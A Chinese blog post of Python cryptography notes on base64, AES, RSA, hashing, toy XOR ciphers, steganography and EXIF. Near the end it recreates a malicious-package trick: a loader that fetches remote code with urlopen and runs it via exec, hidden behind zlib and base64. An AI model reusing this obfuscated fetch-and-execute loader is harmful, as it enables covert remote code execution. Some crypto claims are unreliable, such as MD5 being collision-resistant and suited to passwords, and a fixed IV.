---
layout: post
title: 【密码】代码实现
categories:
tags: 0x58_密码学
keywords:
description:
order: 1242
---


## 前言

常用
- AES
    - 一种对称加密法，安全性很高
    - 用 binascii 对加密后的文本做进一步处理，提高安全性
- 混沌加密法和随机数加密法（可以用于图像）
    - 生成随机数，让随机数与原数据求异或
    - 求两次异或还是本身。
- base64，实际上既不是加密算法，也不是压缩算法。（可以用于图像）
    - 找64个字符，相当于6位二进制
    - 把3个8位二进制表示为4个6位二进制
- zlib，不是加密算法，而是压缩算法


Python 常用的加密模块md5、sha、crypt

## 编码

### 进制

```python
# str 转二进制
# 先转16进制，然后转10进制，然后转2进制。试了写用规则把16进制转2进制，耗时10倍
text_bin = bin(int(text.encode('utf-8').hex(), base=16))[2:]
# text_bit = (np.array(list(text_bin)) == '1')

# 二进制转文本
bytes.fromhex(hex(int(text_bin, base=2))[2:]).decode('utf-8')
```


### base64
实际上不是加密算法，也不是压缩算法，而是一种“编码格式”，可以对文本和图片做编码。
- 用64个字符表示数据（对应6位二进制），因此4个字符（4x6bit）可以表示3个字节（3x8bit）
- A-Z 表示 0-25
- a-z 表示 26-51
- 0-9 表示 52-61
- `+` 和 `/` 表示 62 和63


base64 用于文本
```py
import base64

# 编码
s = '你好吗，123 hello'.encode('utf-8')  # unicode编码转byte类型
s_b64 = base64.b64encode(s)

解码
s_origin = base64.b64decode(s_b64)  # 这个 s_b64 是 byte 格式。如果不是，会自动转为 byte 格式，结果不变
s_origin.decode('utf-8')
```

base64用于文件
```py
import base64

with open("data.csv", "rb") as f:
    s_b64 = base64.b64encode(f.read())  # 返回byte格式

with open('new.csv', 'wb') as f:
    f.write(base64.b64decode(s_b64))


# 先压缩，然后base64
import base64, zlib
# 编码
with open("c.py", "rb") as f:
    s_b64 = base64.b64encode(zlib.compress(f.read()))

# 解码
with open('c_c.py', 'wb') as f:
    f.write(zlib.decompress(base64.b64decode(s_b64)))
```



base64用于图像
```py
# image转base64
import base64

with open("me.png", "rb") as f:
    base64_data = base64.b64encode(f.read())  # 返回byte格式


# 1. 打印文本
print(base64_data)

# 2.1 写为文件
with open("me_new.png", "wb") as f:
    f.write(base64.b64decode(base64_data))

# 2.2 或者按二进制写入到文本中
with open('1.txt', 'wb') as f:
    f.write(base64_data)

# 3. 或者读为二维array
cv2.imdecode(np.frombuffer(base64.b64decode(base64_data_1), np.uint8), cv2.IMREAD_COLOR)

# 3. 如果用的是 jupyter， 可以直接输出图片
from IPython.core.display import HTML
HTML('<img src="data:image/jpg;base64,'+base64_data.decode('utf-8')+'"/>')



# %% base64 转 image
import os, base64

with open("1.txt", "r") as f:
    imgdata = base64.b64decode(f.read())
    file = open('1.jpg', 'wb')
    file.write(imgdata)
    file.close()
```

下面这个图是用这个方法做的，可以看看本页源代码。  

<img height='100px' width='100px' src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABkAAAAZCAMAAADzN3VRAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAEvUExURf///wAAOQIAKgMAUf7+/gAARP39/AAAPgEATQAASQAAIgAAMuGhiN6ZfPX1+D85fgcLXx0YZPnWtfn5+vn48gwGUzgrcdSJe/bJp/TDoPvQremzkP3nzvbz6CgcaFklYSMlYYKFqenq73Z3mPPy8UIzdRwMWdi8kjIweO6/ncx6ZsltY7dQVdOGcL1hYOLh5islaIWFm+7p2NzAo9vJsVc5U5ZRShQFPqxRTUYbOrtwbMyPiH8qS646Uu64ncl7ffHOtGYPOqunvJuVuOnfw009eSMjS+uFdW0qTD8TUf3t2YFBa48LKbNoeqdRZrJYW65GS9PS1FRSeWBSh3dtenNdXuHUu1hPhtGwi8mZhJ17iJwsSf+4ko1aeiYlcj8dXJ0SQfLbuuO7kufn7GEiVtlyAi4AAAGzSURBVCjPbZLldtwwEIUt27Ikw66ZvcycZYZw0lCTMr//U1TatukW7pH+3O9oNCNdjvutUqkkcv9IOn4qn5255bcnqT/BiZtxy+l0ulbT9fyBb5WdipHJuAx9MfS09QwqGAsC3ZWemzEyrmH8qtiDGGMEEcx+fpHN0uUYP0ARUYCJgCu3C0/1GvO7K6XIQAphgcCaLghXi3XgR6o3vwQ8q5dHhCAkGLr+dRNu15rX7iyBfERJDhFdgATrZHIfmn6ktTs7oJxTQk1MIPwgg2UYX683t5ubFUKKyBUAgYTg0cXFRzWOffWu1dnNAJALXJcRB04+3QSRGcf3u0CbthRF7nIFRDAdRVmYZj2MzSjYiu0mz9MzHKRCAMnDsB6YZqhtOw+MiKy3vQR+FPh+XdW0ZmvJ8+f7eSBiwyoTvx6p2sPq24pX9vOkCCGC4wD5vapGWqPRbM1oA/s3zZNcL/fY5a4H06nnNdqXCuCLP5/06Pgl/VV652A8no9no9evngNgS5YoipKdnFbfVavVwUEKJJERSbL7b4bD08McMFeSLDtJ+v3k7/BQYNmlxP5PsFi9A/s7TD0yLve0eFIAAAAASUVORK5CYII=">


一些配置
```python
base64.b64encode(altchars=None)
# altchars 是长度为 2 的 bytes，指定 如何代替 + /

base64.standard_b64encode

base64.urlsafe_b64encode
# 把 + 和 / 换成 - 和 _

base64.b32encode
base64.b32hexencode
base64.b16encode
base64.a85encode
```


### base85

5个字符（`85**5`）表示4个字节 `256**4` （恰好够用）
- 使用 ASCII 33-126，排除字符0，空格（32），删除（127）



## python 加密

```
pip install pycryptodome
```

有时候还需要这样
```py
import crypto
import sys
sys.modules['Crypto'] = crypto
```

### AES


```py
text = '绝密：你好吗？hello world!'.encode('utf-8')
password = '20190808'

from Crypto.Cipher import AES

#%% 加密
cryptor = AES.new(
    key='{:0<16}'.format(password).encode('utf-8')  # key 长度必须是16,24,32 长度的 byte 格式
    , mode=AES.MODE_CBC  # mode 有很多可选，有的不需要 IV
    , IV=b'0123456789abcdef'  # 必须是16位
)

ciphertext_hex = cryptor.encrypt(
    text + b' ' * (16 - len(text) % 16)  # 明文的长度必须是16的整数倍
).hex()  # bytes 类型转 16 进制字符串，便于存储

# %%解密
cryptor2 = AES.new(
    key='{:0<16}'.format(password).encode('utf-8'), mode=AES.MODE_CBC, IV=b'0123456789abcdef'
)
text_decrypt = cryptor2.decrypt(bytes.fromhex(ciphertext_hex)).decode('utf-8')
```

此外，还支持
- 多种 hash 算法 https://www.pycryptodome.org/en/latest/src/hash/hash.html#modern-hash-algorithms




### RSA


```python
import base64

import rsa

# 生成密钥
public_key, private_key = rsa.newkeys(1024)
# 保存密钥
with open('public.key', 'w+') as f:
    f.write(public_key.save_pkcs1().decode())
    print(public_key.save_pkcs1().decode())

with open('private.key', 'w+') as f:
    f.write(private_key.save_pkcs1().decode())
    print(private_key.save_pkcs1().decode())

# 导入密钥
with open('public.pen', 'r') as f:
    public_key = rsa.PublicKey.load_pkcs1(f.read().encode())

with open('private.pen', 'r') as f:
    private_key = rsa.PrivateKey.load_pkcs1(f.read().encode())

# 明文
message = '待加密的文本'

# %%数据加密：公钥加密，私钥解密
# 公钥加密
crypto = rsa.encrypt(message.encode(), public_key)
print('=========用 public_key 加密后的秘文：=======')
print(base64.b64encode(crypto))

# 私钥解密
message = rsa.decrypt(crypto, private_key).decode()
print('=======用 private_key 解密后的明文：=========')
print(message)

# %%用于数字签名：私钥加密，公钥解密

# 私钥签名
signature = rsa.sign(message.encode(), private_key, 'SHA-1')
print('=========签名后的数据：====================')
print(base64.b64encode(signature))

# 公钥验证
print('==========验证签名结果====================')
print(rsa.verify(message.encode(), signature, public_key))
```




### hashlib：md5和sha256

md5
```python
import hashlib

# md5
hashlib.md5('你好，中国！'.encode('utf-8')).hexdigest()

# sha256
hashlib.sha256('你好，中国！'.encode('utf-8')).hexdigest()

# 还有另一种方式
md5 = hashlib.md5()
md5.update('First sentence'.encode('utf-8'))
md5.update('Second sentence'.encode('utf-8'))
md5.hexdigest()

# 文件的md5
with open(path, 'rb') as f:
    print(hashlib.md5(f.read()).hexdigest())


```

MD5的说明
1. MD5 的结果是 128 位，（16字节、32位16进制）
2. 不可逆
3. 高离散性，改变1位，结果就完全不同。（因此抗碰撞）
4. 使用场景：
    - 用户密码保存。用户密码一般不明文存储，否则泄漏后后果严重。存 md5，登陆时比对 md5。这样即使数据库被盗，密码也不会泄露
    - 文件完整性校验，防串改
    - 长url压缩


算法步骤
1. 补 1 + 多个0，使得总长度（bit位）为 $512N + 448$
    - 即使原始长度满足，也要补一次位
    - 最后额外 64 位，放置补位前的长度信息。共计 $512M$ 位
2. 准备4个幻数 $A=01234567, B=89ABCDEF, C=FEDCA98, D=7654321$
    -  运算过程中，采用小端序。（高位在前，低位在后）
    - 因此 $A=0x67452301, B=0xEFCDAB89, C=0x98BADCFE, D=0x10325476$
3. 1个 512 位长度分为 16 份，每份是 32 位二进制（ 4个字节）
3. 准备 4 个函数，入参是 `A,B,C,D,X` ，X 就是 4字节
4. 4个函数都涉及到逻辑运算符，共执行 $16 \times 4 =64$ 次。经过运算，ABCD都变了
4. 对每个 512分片，都执行上一步。
5. 最终得到的 `A,B,C,D`，拼起来就是 md5 值


例子：用户密码存储
```python
import os
import hashlib
import binascii

x1 = hashlib.pbkdf2_hmac(hash_name="sha256"
                        , password=b"p@ssword"
                        , salt=os.urandom(16) # 或者固定盐 salt=b"abc"
                        , iterations=1000)

x = binascii.hexlify(x1).decode()
# 关于盐：
# - 每个用户不同盐值
# - 盐值长度多于8
# 前端可以 HASH 操作，但后端一定要再次进行
# HASH 不能代替 HTTPS
```









```python
# pip install pycryptodome
from Crypto.Hash import SHA256

hash = SHA256.new(data=b'First')
hash.update(b'Second')
hash.update(b'Third')

text_hash = hash.digest()
```













## 混沌加密法
混沌加密法有两个关键技术点：
1. 混沌迭代式 $x_n=ux_{n-1}(1-x_{n-1}),(u \in (3.5699456,4],x_0 \in (0,1))$，呈现 **混沌性**：
    - 一方面如果你不知道参数，你无法根据迭代结果求出参数；
    - 另一方面，如果你知道参数，那么每次迭代的序列都是一样的。
2. $a\oplus b \oplus b=a,\forall a,b$,异或求两次还是自身


迭代加密/解密函数：  
思路是，混沌迭代式的n到m位，与原序列求异或。
```py
def func_chaos(password, input_data):
    u, x, n = password
    output_data = []
    for i in range(n):
        x = u * x * (1 - x)
    for i in input_data:
        x = u * x * (1 - x)
        output_data.append(i ^ (int(x * 127))) # 加密字符串时，是ascii码，所以是127。加密图像用255
    return output_data
```

数据准备
```py
input_data = 'http://www.guofei.site'
password = (3.7, 0.2, 10)
```

加密
```py
clear_data = [ord(i) for i in input_data]
cypher_data = func_chaos(password, clear_data)

cypher_text = [chr(i) for i in cypher_data]
print('加密后：')
print(cypher_data)
print(''.join(cypher_text))
```

解密，和加密完全一样
```py
predict_data = func_chaos(password, cypher_data)
predict_text = [chr(i) for i in predict_data]
print('加密后：')
print(predict_data)
print(''.join(predict_text))
```

## 随机数加密法
### 文本加密
除了用混沌生成器之外，你还可以用随机数生成器


```py
input_data = 'http://www.guofei.site/m/m.md' # 如果你加密对象是一个url，你就能存入大量信息
password = 0
np.random.seed(password)
cypher_data = [ord(i) ^ np.random.randint(127) for i in input_data]
''.join([chr(i) for i in cypher_data])
```

解密
```py
password = 0
cypher_str = 'D[\x010yTl\x10~$;\x15Q8 =1"I(\x12BxCw<\x0bt)'
np.random.seed(password)
clear_data = [chr(ord(i) ^ np.random.randint(127)) for i in cypher_str]
url=''.join(clear_data)
requests.get(url).content.decode('utf-8')
```

### 加密图像
- 加密
```py
input_data = plt.imread('test.jpg')
np.random.seed(0)
cypher_data = input_data ^ np.random.randint(0, 255, size=input_data.shape)
plt.imshow(cypher_data)
```
- 解密
```py
np.random.seed(0)
clear_data = cypher_data ^ np.random.randint(0, 255, size=cypher_data.shape)
plt.imshow(clear_data)
```

## 隐写类算法
### 图像盲水印
[![blind_watermark](https://github-readme-stats.vercel.app/api/pin/?username=guofei9987&repo=blind_watermark&theme=radical)](https://github.com/guofei9987/blind_watermark)

特点
- 可以在图片中嵌入图片、bit数据
- 抗旋转、裁剪等

### 文本盲水印

[![text_blind_watermark](https://github-readme-stats.vercel.app/api/pin/?username=guofei9987&repo=text_blind_watermark&theme=radical)](https://github.com/guofei9987/text_blind_watermark)


### 图种

```bash
# Linux
cat 1.jpg 1.zip > output.jpg

# Windows
copy/b 1.jpg+1.zip=output.jpg
```

如何提取：把扩展名改为zip，然后解压即可
- 编辑一下就破坏了

### EXIF

```python
# 方法1:可读性更好
# pip install exifread
import exifread  # 专门用来读图片exif信息的库

with open('img.JPG', 'rb') as f:
    tags = exifread.process_file(f)


# %%
# 方法2:更底层的数据
from PIL import Image

img = Image.open("img.JPG")
img._getexif()
# 或者：
list(img._exif.items())
# 或者转为容易理解的格式：
import PIL.ExifTags
exif = {
    PIL.ExifTags.TAGS[k]: v
    for k, v in img._getexif().items()
    if k in PIL.ExifTags.TAGS
}
```

额外：
- 编号和对应的意义：https://zhuanlan.zhihu.com/p/366726838

<table><tbody><tr><th>标签号</th><th>Exif 定义名</th><th>中文定义名</th><th>备注</th></tr><tr><td>0x010E</td><td>ImageDescription</td><td>图像描述</td><td></td></tr><tr><td>0x013B</td><td>Artist</td><td>作者</td><td></td></tr><tr><td>0x010F</td><td>Make</td><td>生产商</td><td></td></tr><tr><td>0x0110</td><td>Model</td><td>型号</td><td>相机型号</td></tr><tr><td>0x0112</td><td>Orientation</td><td>方向</td><td></td></tr><tr><td>0x011A</td><td>XResolution</td><td>水平方向分辨率</td><td></td></tr><tr><td>0x011B</td><td>YResolution</td><td>垂直方向分辨率</td><td></td></tr><tr><td>0x0128</td><td>ResolutionUnit</td><td>分辨率单位</td><td></td></tr><tr><td>0x0131</td><td>Software</td><td>软件</td><td>固件Firmware版本或者编辑软件</td></tr><tr><td>0x0132</td><td>DateTime</td><td>日期和时间</td><td>照片最后修改时间</td></tr><tr><td>0x0213</td><td>YCbCrPositioning</td><td>YCbCr定位</td><td></td></tr><tr><td>0x8769</td><td>ExifOffset</td><td>Exif子IFD偏移量</td><td></td></tr><tr><td>0x829A</td><td>ExposureTime</td><td>曝光时间</td><td>快门速度</td></tr><tr><td>0x829D</td><td>FNumber</td><td>光圈系数</td><td>光圈的F值</td></tr><tr><td>0x8822</td><td>ExposureProgram</td><td>曝光程序</td><td>自动曝光、光圈优先、快门优先、M档等</td></tr><tr><td>0x8827</td><td>ISOSpeedRatings</td><td>ISO感光度</td><td></td></tr><tr><td>0x9000</td><td>ExifVersion</td><td>Exif 版本</td><td></td></tr><tr><td>0x9003</td><td>DateTimeOriginal</td><td>拍摄时间</td><td>照片拍摄时间</td></tr><tr><td>0x9004</td><td>DateTimeDigitized</td><td>数字化时间</td><td>照片被写入时间</td></tr><tr><td>0x9204</td><td>ExposureBiasValue</td><td>曝光补偿</td><td></td></tr><tr><td>0x9205</td><td>MaxApertureValue</td><td>最大光圈</td><td></td></tr><tr><td>0x9207</td><td>MeteringMode</td><td>测光模式</td><td>平均测光、中央重点测光、点测光</td></tr><tr><td>0x9208</td><td>Lightsource</td><td>光源</td><td>一般记录白平衡</td></tr><tr><td>0x9209</td><td>Flash</td><td>闪光灯</td><td>闪光灯状态</td></tr><tr><td>0x920A</td><td>FocalLength</td><td>镜头焦距</td><td>镜头物理焦距</td></tr><tr><td>0x927C</td><td>MakerNote</td><td>厂商注释</td><td></td></tr><tr><td>0x9286</td><td>UserComment</td><td>用户注释</td><td></td></tr><tr><td>0xA000</td><td>FlashPixVersion</td><td>FlashPix版本</td><td></td></tr><tr><td></td><td>ColorSpace</td><td>色彩空间</td><td>AdobeRGB、sRGB等</td></tr><tr><td></td><td>ExifImageWidth</td><td>图像宽度</td><td></td></tr><tr><td>0xA003</td><td>ExifImageLength</td><td>图像高度</td><td></td></tr><tr><td>0xA433</td><td>LensMake</td><td>镜头生产商</td><td></td></tr><tr><td>0xA434</td><td>LensModel</td><td>镜头型号</td><td></td></tr></tbody></table>

如何修改并写出（缺点：只支持JEPG和WebP）
```python
# https://github.com/hMatoba/Piexif
# pip install piexif
from PIL import Image
import piexif

im = Image.open('a.jpg')
exif_data = im.info['exif']  # 二进制格式的exif

# 借助 piexif 来修改并写入文件
exif_dict = piexif.load(exif_data)  # 二进制格式转 dict 格式
exif_dict['0th'][270] = 'hello, guofei9987!'.encode('utf-8')  # 写入信息
exif_bytes = piexif.dump(exif_dict)  # dict 格式转回二进制格式
im.save('output.jpg', "JPEG", quality=85, exif=exif_bytes)  # 保存文件

# %%
# 试试提取刚才写入的信息
im = Image.open('output.jpg')
exif_data = im.info['exif']  # 二进制格式的exif
exif_dict = piexif.load(exif_data)
exif_dict['0th'][270]
```


piexif 对应的方法：
- `exif_dict = piexif.load(filename)` - Get exif data as dict.
- `exif_bytes = piexif.dump(exif_dict)` - Get exif as bytes.
- piexif.insert(exif_bytes, filename) - Insert exif into JPEG, or WebP.
- piexif.remove(filename) - Remove exif from JPEG, or WebP.
- piexif.transplant(filename, filename) - Transplant exif from JPEG to JPEG.

经过试验，可以插入的通道：
- `exif_dict['Exif'][37510]`：用户注释，似乎较为隐蔽。但任意编辑后会消失
- `exif_dict['0th'][270]`：图像说明，不隐蔽
- 265,266,273,274,277
- 269:文稿名称；270，图片说明；271，品牌

又额外：png格式是这么修改的（好像不是EXIF，而是又一种通道；生成的图片随便编辑一下信息就没了）：
```python
from PIL import Image
from PIL.PngImagePlugin import PngInfo

img_path='img_output.jpg'
targetImage = Image.open(img_path)

metadata = PngInfo()
metadata.add_text("MyNewString", "A string")
metadata.add_text("MyNewInt", str(1234))

targetImage.save("NewPath.png", pnginfo=metadata)
targetImage = Image.open("NewPath.png")

print(targetImage.text)
```

### MP3中的隐藏信息

```
def get_mp3_meta(filename):
    fp = open(filename, 'rb')
    fp.seek(-128, 2)
    fp.read(3)  # TAG iniziale
    title = fp.read(30)
    artist = fp.read(30)
    album = fp.read(30)
    anno = fp.read(4)
    comment = fp.read(28)

    fp.close()
    return {'title': title, 'artist': artist, 'album': album, 'anno': anno, "comment": comment}
```




## 实战举例

### 暗代码
（不要用来搞破坏。）  
案例来自 `python3-dateutil`，本文去掉了恶意部分，原文见于 [知乎](https://zhuanlan.zhihu.com/p/95554881)。  
原理：用脚本自动下载网络上的一段代码，然后执行。控制这个过程的代码用base64隐藏起来。


step1: 恶意代码放网上，[例子](http://img1.github.io/c/a.py)  
这里作为demo代码如下：
```python
print('Notice!')
print('You are in danger!')
print('Check your security strategy now!')
```

step2:触发代码+zlib压缩+base64隐藏
```python
codes='''
try:
    try:from urllib2 import urlopen
    except:from urllib.request import urlopen
    exec(urlopen('http://img1.github.io/c/a.py').read())
except:pass'''

import zlib, base64

code_=base64.b64encode(zlib.compress(codes.encode('utf-8')))
```

step3:触发代码  
```python
import zlib,base64

CODE = ''
CODE += 'eJxtjT0OhSAQhHtOQSc0EF/pbRBX3URkXZZEb+9PLCzeVDOTLzNK+OiUvnSb'
CODE += 'kXPSlZcF+5/GRJnljplgfRjYI5B8McewVSjyn4Zo3sI0swh13mOaWjehzLV3'
CODE += 'mH30wdHR2GsnDMZa9V5QKOUEXQY1cg=='


exec(zlib.decompress(base64.b64decode(CODE)))
```

### 暗口令
```python
# -*- coding: utf-8 -*-
import random
import zlib  # 用来压缩


class PositiveSpirit:
    # based on https://github.com/sym233/core-values-encoder
    def __init__(self, password=0):
        self.VALUE_WORD = ('富强', '文明', '和谐', '平等', "公正", '法治', "爱国", '敬业', '诚信', '友善'
                           , '幸福', '快乐', '向上', '积极', '乐观', '奋斗')
        self.HEX_WORD = list('0123456789abcdef')
        self.password = password
        # 加密
        random.seed(self.password)
        random.shuffle(self.HEX_WORD)
        self.encode_dict = {self.HEX_WORD[i]: self.VALUE_WORD[i] for i in range(16)}
        self.decode_dict = {self.VALUE_WORD[i]: self.HEX_WORD[i] for i in range(16)}

    def encode(self, ori_str):
        encrypt_str = zlib.compress(ori_str.encode('utf-8')).hex()  # 压缩
        encrypt_str = ''.join([self.encode_dict[i] for i in encrypt_str])
        return encrypt_str

    def decode(self, encrypt_str):
        part1, part2 = encrypt_str[::2], encrypt_str[1::2]
        encrypt_split = [part1[i] + part2[i] for i in range(len(part1))]
        encrypt_split = [self.decode_dict[i] for i in encrypt_split]
        return zlib.decompress(bytes.fromhex(''.join(encrypt_split))).decode('utf-8')


if __name__ == '__main__':
    ps = PositiveSpirit(password=1)
    str_encode = ps.encode('hello, 测试！' * 30)
    ps.decode(str_encode)
```
